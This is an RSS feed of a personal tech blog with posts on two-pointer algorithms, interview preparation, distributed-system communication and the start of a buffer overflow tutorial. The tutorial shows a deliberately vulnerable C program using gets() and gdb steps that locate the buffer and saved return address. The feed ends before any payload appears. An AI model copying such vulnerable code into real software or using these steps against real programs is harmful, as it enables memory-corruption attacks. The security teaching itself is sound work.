<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pufan Jiang&#39;s Blog</title>
    <description>Pufan Jiang&#39;s personal blog, including lots of tech blogs, photo shooting etc.</description>
    <link>http://huangxuan.me/</link>
    <atom:link href="http://huangxuan.me/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 19 Feb 2016 20:54:44 -0500</pubDate>
    <lastBuildDate>Fri, 19 Feb 2016 20:54:44 -0500</lastBuildDate>
    <generator>Jekyll v2.4.0</generator>
    
      <item>
        <title>Cracking Code Challenge - Two pointers</title>
        <description>&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;

&lt;p&gt;Two pointers is an idea applicable to many algorithm challenge. The key idea is to think in a parallel way, rather than sequential way which is more natural to humans.&lt;/p&gt;

&lt;p&gt;In this post, I will show how to apply the idea of two pointers to these example problems:&lt;br /&gt;
1.&lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;br /&gt;
2.&lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;br /&gt;
3.&lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;br /&gt;
4.&lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-use-two-pointers-idea&quot;&gt;How to use two pointers idea&lt;/h2&gt;

&lt;p&gt;Whenever you find the problem has two boundaries, or two chains (a human-readable word for LinkedList XD) etc. you could try with two pointers idea.&lt;/p&gt;

&lt;p&gt;The trick for using two pointers is three step:&lt;br /&gt;
1.Identify where to begin, i.e. where are the start points of the two pointers.&lt;br /&gt;
2.Identify how to move on, i.e. each step how should the two pointers ‘walk’, which of them should ‘walk’.&lt;br /&gt;
3.Identify when to stop, i.e. the condition to stop or swap turn in ‘walk’.&lt;/p&gt;

&lt;h2 id=&quot;example-1---intersection-of-two-linked-lists&quot;&gt;Example 1 - Intersection of Two Linked Lists&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There are lots of ways to solve this problem, with tradeoff among time, space and development complexity.&lt;/p&gt;

&lt;p&gt;When analyzing complexity of algorithm, we suppose both linked list has length N, and number of nodes before intersection is L.&lt;/p&gt;

&lt;h3 id=&quot;most-straightforward-way&quot;&gt;Most straightforward way&lt;/h3&gt;

&lt;p&gt;The most straightforward way is first iterate one linked list, store every node in a hash table. Then iterate the second linked list, check whether the node is already in hash table for each iteration and stop when find the first one.&lt;/p&gt;

&lt;p&gt;The time complexity is O(N + L). And space complexity is O(N).&lt;/p&gt;

&lt;h3 id=&quot;improve-space-complexity-to-o1&quot;&gt;Improve space complexity to O(1)&lt;/h3&gt;

&lt;p&gt;Suppose the lengths of two linked lists are the same, i.e. before intersection the two linked lists have same number of nodes, then if there are two pointers walking through two linked list at same time and speed, then the first time they meet it the intersection.&lt;/p&gt;

&lt;p&gt;Now the problem is we are not guaranteed that these two linked list are of same length. Could we possibly make them the same? &lt;strong&gt;stop here, and think&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Of course! If we could calculate the difference of lengths of two linked list, then just pass several nodes of the longer linked list, then the lengths are the same!&lt;/p&gt;

&lt;p&gt;This algorithm has O(2N + 2L) time complexity but only O(1) space complexity.&lt;/p&gt;

&lt;p&gt;The solution of this method is actually given &lt;a href=&quot;http://www.geeksforgeeks.org/write-a-function-to-get-the-intersection-point-of-two-linked-lists/&quot;&gt;here at method 3&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;improve-time-complexity-to-o2l&quot;&gt;Improve time complexity to O(2L)&lt;/h3&gt;

&lt;p&gt;This is my original solution that I never find online. This solution actually use more space but is faster averagely.&lt;/p&gt;

&lt;p&gt;So the problem of our naive solution is that we traverse the two linked lists one by one. Notice these two linked lists are actually symmetric, so that we could check if node in list A has been met in list B ……. and also if node in list B has been met in list A &lt;strong&gt;at same time&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Given this idea, we could have two pointers starting together, each has a hash table saving iterated nodes. Each iteration, both pointers check if the new node is in hash table of the other pointer. And it could stop as soon as one of pointer find such a node, which is the intersection.&lt;/p&gt;

&lt;p&gt;This algorithm gives O(2L) time complexity and O(2L) space complexity. So in worst case, this is O(2N) time complexity and O(2N) space complexity. But averagely it has O(N) time complexity and O(N) space complexity.&lt;/p&gt;

&lt;h2 id=&quot;example-2---merge-sorted-array&quot;&gt;Example 2 - Merge Sorted Array&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a great example to use two pointer idea. If you go through two arrays one by one, then either you could first save one array in a hash table, and check existence when traversing the second array, or you could use binary search when traversing both arrays. Both methods sacrifice time or space to some extend.&lt;/p&gt;

&lt;p&gt;The actual trick in this problem is the second step of two pointers solution, i.e. how to move on. Notice the arrays are sorted, so that we are guaranteed the pointed value is increasing. This indicates, if pointer A is pointing to larger number than pointer B, then any number after pointer A could not be the same as the number at pointer B.&lt;/p&gt;

&lt;p&gt;This key idea results in this algorithm.&lt;/p&gt;

&lt;h2 id=&quot;example-3----container-with-most-water&quot;&gt;Example 3 – Container With Most Water&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you may noticed, the constraint of this problem that requires two boundaries falls in pattern of two pointers. So a quick idea is using two pointers as two boundaries, and to find two position than could hold most water.&lt;/p&gt;

&lt;p&gt;Now let’s go through three steps in two pointers problem.&lt;/p&gt;

&lt;p&gt;First, where to begin? The naive way is go from one side to another side and search all possible combinations. This will result in O(N^2) time complexity. It sucks. A commonly used trick is we one pointer go from begin and another from end, then two pointers go face to face towards middle. The key idea is a little bit similar to dynamic programming, i.e. if I could know what happen given boundary [i, j], then I could calculate the condition given boundary [i + 1, j - 1] really fast.&lt;/p&gt;

&lt;p&gt;Second, how to move on? To solve the problem with O(N) algorithm, each iteration must give one choice. What I mean is, given condition of [i, j], we could then check [i + 1, j] and [i, j - 1] and to iteratively find the result, but in this way it still is a O(N^2) algorithm. If we could eliminate one of the possibility, then the algorithm would be O(N)! Actually we could do that. If height at i is smaller than height at j, then there’s no reason for us to check [i, j - 1]! So we move the one with smaller height toward the larger one.&lt;/p&gt;

&lt;p&gt;Third, when to stop? Obviously, when two pointers meet, we stop.&lt;/p&gt;

&lt;p&gt;The time complexity of this algorithm is O(N) and space complexity is O(1).&lt;/p&gt;

&lt;h2 id=&quot;example-4----trapping-rain-water&quot;&gt;Example 4 – Trapping Rain Water&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Although this is a hard level problem in leetcode, given the solution to above problem, it should be easy to think of the solution to this one.&lt;/p&gt;

&lt;p&gt;To briefly explain the solution to this problem, we use two pointer start from begin and end, and go toward each other. Each time we move the pointer with shorter block to the one with bigger, and calculate the water trapping within the range. We stop when two pointers meet.&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Feb 2016 20:53:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-Two-pointers/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-Two-pointers/</guid>
        
        <category>Two Pointers</category>
        
        <category>Code Challenge</category>
        
        <category>leetcode</category>
        
        
      </item>
    
      <item>
        <title>Cracking Code Challenge the Hard Way</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;This blog series are to help new grads like me to prepare algorithm interview/tech interview. These posts focus on common useful data structures, algorithms, test strategies and some tricks to help you to crack code challenge!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;situation-at-tech-industry-is-not-that-bad&quot;&gt;Situation at tech industry is not that bad&lt;/h2&gt;

&lt;p&gt;Yes, many said another tech bubble is bursting. Twitter fired around 8 percent of their employees, much are from engineer and product teams[1]. LinkedIn’s value drop by almost half (nearly 11 billions) in one single night[2]. STEM Opt extension is under possibility to be cut[3].&lt;/p&gt;

&lt;p&gt;But, as far as I have observed, the situation is not that bad. Tech companies still pay large amount of dollars to provide flights and hotels for interviewees. The head counts of large tech companies(e.g. FLAG) may be reduced but overall head counts, including great number of emerging small companies, is still amazingly high. New Grads are still getting decent salaries and bonus.&lt;/p&gt;

&lt;h2 id=&quot;yet-you-need-to-be-well-prepared&quot;&gt;Yet you need to be well-prepared&lt;/h2&gt;

&lt;p&gt;I have no dare neither experience to foretell the future of computer science industry. But the truth is competition has significantly raised during these years. Even five years ago, the famous &lt;a href=&quot;leetcode.com&quot;&gt;Leetcode.com&lt;/a&gt; (a coding practice platform) has no more than one hundred problems and a student mastering all these solutions would be very likely to be hired by good tech companies. But the website has more than three hundred problems now (334 on Feb 19th 2016) and one not only need to solve these problems but is also required to solve them bug-freely.&lt;/p&gt;

&lt;p&gt;It is hard. It is the reality.&lt;/p&gt;

&lt;h2 id=&quot;whats-this-blog-series-is&quot;&gt;What’s this blog series is?&lt;/h2&gt;

&lt;p&gt;The motivation for this series is to help young CS students, especially newbies, to better prepare frequent technical questions.&lt;/p&gt;

&lt;p&gt;There are several common solution to all these questions, and each solution shows, given constraints or simplification of real-world scenario, how a software engineer thinks from a programmer’s perspective, i.e. tradeoff among space and time complexity or tradeoff among development complexity and algorithm efficiency etc.&lt;/p&gt;

&lt;p&gt;In this series, you would hopefully learn when and how to use some most useful data structures and algorithms, the difference and tradeoff among these data structures and algorithms, how to implement some of these data structures, and how to analyze time and space tradeoff among these data structures and algorithms.&lt;/p&gt;

&lt;h2 id=&quot;what-this-blog-series-is-not&quot;&gt;What this blog series is NOT?&lt;/h2&gt;

&lt;p&gt;I definitely absolutely totally do not want you to memorize the solutions here. Surely there are some patterns/templates that maybe helpful if you remember them. But the solution is based on an deep understanding of all those data structures and algorithms and a little bit of tricks.&lt;/p&gt;

&lt;p&gt;Remember that memorizing a solution always do no good to your interview.&lt;/p&gt;

&lt;h2 id=&quot;entries-to-cracking-code-challenge&quot;&gt;Entries to Cracking Code Challenge&lt;/h2&gt;

&lt;p&gt;Here is links for all articles in the series (continuously adding more).&lt;br /&gt;
1. Two pointers&lt;br /&gt;
2. Binary Tree (Binary tree, Thread Tree)&lt;br /&gt;
3. Dictionary Problem (Hashmap, Perfect hashing, Trie Tree)&lt;br /&gt;
3. Scanning Line Problem (Priority queue)&lt;br /&gt;
4. Sliding Stream and Sliding Window Problem (Priority queue and Monotone priority queue)&lt;br /&gt;
5. Dynamic Programming (Hashmap)&lt;br /&gt;
6. LinkedList&lt;br /&gt;
7. Search (Binary search, Hashmap)&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]&lt;a href=&quot;http://www.sfgate.com/business/article/Twitter-to-lay-off-336-employees-6568501.php&quot;&gt;Twitter lays off 336 employees upon Dorsey’s return as CEO&lt;/a&gt;&lt;br /&gt;
[2]&lt;a href=&quot;http://www.reuters.com/article/linkedin-results-research-idUSKCN0VE1N0&quot;&gt;LinkedIn sheds $11 billion in value on stock’s worst day since debut&lt;/a&gt;&lt;br /&gt;
[3]&lt;a href=&quot;http://www.nafsa.org/Find_Resources/Supporting_International_Students_And_Scholars/ISS_Issues/Issues/Focus_On_STEM_OPT/&quot;&gt;Focus On STEM OPT&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 19 Feb 2016 16:12:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-the-Hard-Way/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-the-Hard-Way/</guid>
        
        <category>Code Challenge</category>
        
        <category>Algorithm</category>
        
        <category>Data Structure</category>
        
        <category>Interview</category>
        
        
      </item>
    
      <item>
        <title>Talking within Distributed System</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;This is a short series about some important concepts in distributed system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;

&lt;p&gt;In this article, I first tried to explain what’s difference between communication in distributed system and local machine.&lt;/p&gt;

&lt;p&gt;Then I talked about two most popular way to communicate within a distributed system, i.e. message passing and RPC, and analyzed the advantages and disadvantages of them.&lt;/p&gt;

&lt;p&gt;Finally, I introduced two most successful protocol using these two communication idea, i.e. RESTful and Thrift.&lt;/p&gt;

&lt;h2 id=&quot;why-talking-within-distributed-system-is-different-from-local-machine&quot;&gt;Why talking within distributed system is different from local machine?&lt;/h2&gt;

&lt;p&gt;In a local machine, when process A is communicating with process B, it could be done in a synchronized fashion guaranteed by electrical circuit or the so-called bus built in your laptop or server. So the delivery time is always constant, corresponding to several clock cycles.&lt;/p&gt;

&lt;p&gt;The fundamental difference of distributed system and local machine is due to network unreliability. When machine A is sending message to or call function at machine B, there is not such bus connecting them so that they could only communicate through network. So either machine A get an acknowledgement message and it could be sure that machine B receive the message, or it has to wait indefinitely since it could never tell whether the message is lost or it is network congestion.&lt;/p&gt;

&lt;p&gt;So it is the case that I know what I know, but I don’t know what others know, and I don’t know what others know others know…&lt;/p&gt;

&lt;h2 id=&quot;an-example&quot;&gt;An example&lt;/h2&gt;

&lt;p&gt;Through the next of this post, we will examine a simple common example &lt;code&gt;distcp&lt;/code&gt;. So the semantic of &lt;code&gt;distcp&lt;/code&gt; is the same as &lt;code&gt;cp&lt;/code&gt; (copy) method, it copies data from one location to another.&lt;/p&gt;

&lt;p&gt;More specifically, when machine A runs &lt;code&gt;distcp path1/file path2&lt;/code&gt;, it copy &lt;code&gt;file&lt;/code&gt; from &lt;code&gt;path1&lt;/code&gt; to &lt;code&gt;path2&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;message-passing&quot;&gt;Message Passing&lt;/h2&gt;

&lt;p&gt;So message passing is actually the most straightforward and also most widely used way to implement distributed system communication (think about Internet!).&lt;/p&gt;

&lt;p&gt;Message Passing defines two basic method, &lt;strong&gt;send()&lt;/strong&gt; and &lt;strong&gt;receive()&lt;/strong&gt;.  It sends the whole information including operator (in our case it is &lt;code&gt;distcp&lt;/code&gt;) and operands (in our case it is &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;) through network. And when receiver receives the message, it lookups the operator and finds corresponding local method and then finishes the job.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is straightforward/user-friendly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, despite the good point of message passing, this method leaves a lot of burden to application programmer. A common message passing is very like this:&lt;br /&gt;
On sender’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MessageFactor.createMessage(&quot;distcp&quot;).setArgument(0, &quot;path1/file&quot;).setArgument(1, &quot;path2&quot;).send(ip of machine B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On receiver’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;operator = receive().getOperator();
switch(operator) {
	case &quot;distcp&quot;: copy to path; break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are two obvious problem.&lt;br /&gt;
1.Programmer needs to do lots of work to control the logic, especially on receiver’s side.&lt;br /&gt;
2.The program could not make use of compile check to make sure the sending message is correct. This significantly increase the possibility of runtime error.&lt;/p&gt;

&lt;h2 id=&quot;remote-procedure-call-rpc&quot;&gt;Remote Procedure Call (RPC)&lt;/h2&gt;

&lt;p&gt;So to reduce the burden of programmers and make our program more predictable, RPC is a good idea.&lt;/p&gt;

&lt;p&gt;The core idea of RPC is to provide an interface for both local and remote procedure call, so that programmer could call remote function just like call local function.&lt;/p&gt;

&lt;p&gt;So the RPC way of our function is very like to be this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;register_path(&quot;path1&quot;, ip of machine A);
register_path(&quot;path2&quot;, ip of machine B);
dist(&quot;path1/file&quot;, &quot;path2&quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it is done! How to find the file and how to bind the data is left to RPC service. After binding the path and machine, the programmer doesn’t need to worry about the whole logic. Moreover, now we could at compile time check whether the programmer provides exactly two arguments , reducing runtime error.&lt;/p&gt;

&lt;p&gt;Also, it a lot of distributed system, e.g. Hadoop platform, there’s a master machine to take care of path binding, so the two &lt;code&gt;register_path&lt;/code&gt; method could be avoided as well!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; To understand how the RPC service is implemented, I encourage you to further read some posts online or this paper &lt;a href=&quot;http://doi.acm.org/10.1145/2080.357392&quot;&gt;Implementing remote procedure calls&lt;/a&gt; by Andrew and Bruce.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1.RPC provide the abstraction of procedure call so that programmers could use these services easily just as using local methods.&lt;br /&gt;
2.It also helps reducing runtime errors.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
Now RPC may seems really attracting, it has one important disadvantages compared to message passing – the service itself is much complicated.&lt;/p&gt;

&lt;p&gt;Yes, the user/programmer is relieved from handling logic and data binding themselves, but the API provider/RPC service provider need to do a lot of work, including defining interface, implementing logic etc. The complication is significant when testing some new functions, since the API may change frequently during development.&lt;/p&gt;

&lt;h2 id=&quot;real-world-implementation&quot;&gt;Real World Implementation&lt;/h2&gt;

&lt;p&gt;Now we scratched the surface of both two common communication ways, how and when do we prefer one to the other? Let’s see two most widely used communication protocol in web service today.&lt;/p&gt;

&lt;h3 id=&quot;restful&quot;&gt;RESTful&lt;/h3&gt;

&lt;p&gt;I’m not going to talk about what is RESTful. I assume you have already know what it is and hopefully you have used it several times in your previous projects.&lt;/p&gt;

&lt;p&gt;RESTful is a good example using the idea of message passing. For &lt;strong&gt;send()&lt;/strong&gt; method, it supports four operators, i.e. GET, PUT, POST and DELETE, and nearly unlimited number of operands (within bound of network limit of course). And &lt;strong&gt;receive()&lt;/strong&gt; method is handled by HTTP request.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Lightweight. Since RESTful API is often used for implementing CRUD operations in database, so the message is generally short.&lt;br /&gt;
2.User-friendly. RESTful has same semantics with HTTP request, thus learning curve of RESTful is almost zero degree!&lt;br /&gt;
3.Language/Platform independence. Since RESTful is nothing but HTTP request, it has no constraints on language or system platform.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
The disadvantage of RESTful stems from HTTP protocol itself.&lt;/p&gt;

&lt;p&gt;One thing is RESTful does not support basic method other than HTTP’s methods. Although one could put operator inside body of HTTP request, but that would lose the lightweight property of RESTful.&lt;/p&gt;

&lt;p&gt;Another disadvantage is HTTP request is expensive. Each HTTP request is generally a blocking process, harming the scalability of system. (This is said be overcome in HTTP 2.0, I’m not quite familiar with HTTP 2.0, but this disadvantage holds for HTTP 1.1).&lt;/p&gt;

&lt;h3 id=&quot;thrift&quot;&gt;Thrift&lt;/h3&gt;

&lt;p&gt;My understanding of Thrift may not be correct and well-rounded, since I haven’t use Thrift a lot. But generally, Thrift is a protocol based on RPC so that to simplify remote call process and with goal of a fast, reliable and safe communication.&lt;/p&gt;

&lt;p&gt;To use Thrift, you need first define the RPC interface using Interface Definition Language (IDL). This interface is a constraint that both server and clients using the method should follow. After you defined the interface, it is Thrift that will take care of the underlying communication and compile time checking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Provide compile time checking. Thrift is much stricter than RESTful, but the goodness is it could help avoid lots of small errors.&lt;br /&gt;
2.It is faaaaast. RPC generally take advantages of UDP protocol and binding acknowledgement message with next request to avoid overhead and amount of exchanging data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
It is obvious that Thrift is way complicated than RESTful API. It also doesn’t have a universal method name (e.g. GET in RESTful). Therefore developers need to first learn the interface of different Thrift library then could they move on.&lt;/p&gt;

&lt;h2 id=&quot;discussion&quot;&gt;Discussion&lt;/h2&gt;

&lt;p&gt;So how to choose among them? Like most design in computer science, there is no absolute yes or no to choose one protocol rather than the other.&lt;/p&gt;

&lt;p&gt;It has been a consensus that, generally, when developing light-weight api, especially those similar with CRUD operations, and when your api is used by lots of users, then RESTful may be better choice. While developing api that is internally used, or logically complicated, or fast is your first priority, then Thrift may be better.&lt;/p&gt;

&lt;p&gt;In comparison these protocol, here is a great &lt;a href=&quot;http://nordicapis.com/microservice-showdown-rest-vs-soap-vs-apache-thrift-and-why-it-matters/&quot;&gt;article&lt;/a&gt; by Kristopher  Sandoval. I quote part of the article here, but you should definitely read through that great post.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;REST, on the other hand, is like a pre-paid postcard. You’ve forgone the envelope in favor of a lightweight, succinct delivery device that is easy to interpret and handle, with your message quickly scribbled on the back. The postcard uses less material (bandwidth), is typically shorter in content, and might actually get to your neighbor faster because there’s less bulk to move around.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Thrift is like a megaphone. When you point the megaphone at your neighbor, he implicitly knows you’re upset about something — and that you’re going to say it specifically to him. He knows what to do with the information, because the reaction a human has to a megaphone is pretty universal (assuming, of course, that your megaphone is louder than his drums). The message is sent in a lightweight but forceful manner that depends entirely on the receiver to properly process it, in this case your neighbor.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Fri, 19 Feb 2016 14:41:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</guid>
        
        <category>Distributed System</category>
        
        <category>Network</category>
        
        <category>Communication</category>
        
        <category>Message Passing</category>
        
        <category>RPC</category>
        
        <category>Remote Procedure Call</category>
        
        <category>RESTful</category>
        
        <category>Thrift</category>
        
        
      </item>
    
      <item>
        <title>Secure Threats -- Buffer Overflow Attack -- Level 0</title>
        <description>&lt;p&gt;This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)&lt;/p&gt;

&lt;p&gt;This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pre-requisite&lt;/strong&gt; &lt;br /&gt;
The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Familiar with C language. (This series would use C program as example.) And know how to use a &lt;code&gt;gdb&lt;/code&gt; to debug C program.&lt;/li&gt;
  &lt;li&gt;Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)&lt;/li&gt;
  &lt;li&gt;Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png&quot; alt=&quot;Program Memory Organization&quot; /&gt; &lt;br /&gt;
&lt;em&gt;(&lt;a href=&quot;http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;amp;qid=1454639716&amp;amp;sr=8-3&amp;amp;keywords=csapp&quot;&gt;Computer System : A Programmer’s Perspective 2nd&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;

&lt;p&gt;Great, now you are ready to hack a system, and I’m showing you a way.&lt;/p&gt;

&lt;h3 id=&quot;what-is-buffer-overflow&quot;&gt;What is Buffer Overflow&lt;/h3&gt;
&lt;p&gt;Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.&lt;/p&gt;

&lt;h3 id=&quot;an-example-your-first-hacking-attack&quot;&gt;An Example (Your first hacking attack!)&lt;/h3&gt;

&lt;p&gt;To make this clearer, let’s see a typical example.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic.c */
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

/* server code, I&#39;m victim */
int main(int argc, char** argv)
{
    char buf[16] ;

    printf(&quot;Hi, I&#39;m server.\n&quot;);
    gets(buf);
    printf(&quot;you entered: %s\n&quot;, buf);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this &lt;code&gt;gets&lt;/code&gt; function. Basically &lt;code&gt;gets&lt;/code&gt; copy string from standard input to &lt;code&gt;buf&lt;/code&gt;. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.&lt;/p&gt;

&lt;p&gt;By running following script,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -o basic basic.c -m32
objdump -d basic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we could get assembly code of &lt;code&gt;basic&lt;/code&gt;. &lt;br /&gt;
(&lt;strong&gt;Note we add a &lt;code&gt;-m32&lt;/code&gt; here to compile it to a 32-bit version&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;08048480 &amp;lt;main&amp;gt;:
 ......
 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
 804849c:  e8 9f fe ff ff     call   8048340 &amp;lt;gets@plt&amp;gt;
 ......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.&lt;/p&gt;

&lt;h4 id=&quot;now-is-key-point&quot;&gt;&lt;strong&gt;Now is key point.&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Then what &lt;code&gt;gets&lt;/code&gt; function does is it go through standard input and copy byte by byte to &lt;code&gt;buf&lt;/code&gt; until it met a &lt;code&gt;null&lt;/code&gt; terminator. However, the &lt;code&gt;gets&lt;/code&gt; function doesn’t check input length! So what if we input a very long sentence?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ echo &quot;a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence&quot; | ./basic
Hi, I&#39;m server.
you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.&lt;/p&gt;

&lt;p&gt;And this is why this kind of attack is called Buffer Overflow Attack.&lt;/p&gt;

&lt;h2 id=&quot;to-do-a-real-attack&quot;&gt;To do a real attack&lt;/h2&gt;

&lt;p&gt;To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.&lt;/p&gt;

&lt;h4 id=&quot;analysis&quot;&gt;&lt;strong&gt;Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;By using &lt;code&gt;gdb&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x804849c
Breakpoint 1 at 0x804849c
(gdb) r
Starting program: basic 
Hi, I&#39;m server.

Breakpoint 1, 0x0804849c in main ()
(gdb) i r esp
esp            0xffffd210       0xffffd210
(gdb) x/wx 0xffffd210
0xffffd210:     0xffffd220
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find right before &lt;code&gt;gets&lt;/code&gt;  is called, &lt;code&gt;esp&lt;/code&gt; is pointing to &lt;code&gt;0xffffd220&lt;/code&gt;, which means our input message will be written to this address. &lt;br /&gt;
Also, if we set breakpoint at beginning of &lt;code&gt;main&lt;/code&gt; function,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x0x8048480
Breakpoint 2 at 0x8048480
(gdb) r
Starting program: basic
Breakpoint 2, 0x08048480 in main ()
(gdb) i r esp
esp            0xffffd23c       0xffffd23c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find return address for &lt;code&gt;main&lt;/code&gt; function is saved at  &lt;code&gt;0xffffd23c&lt;/code&gt;.&lt;/p&gt;

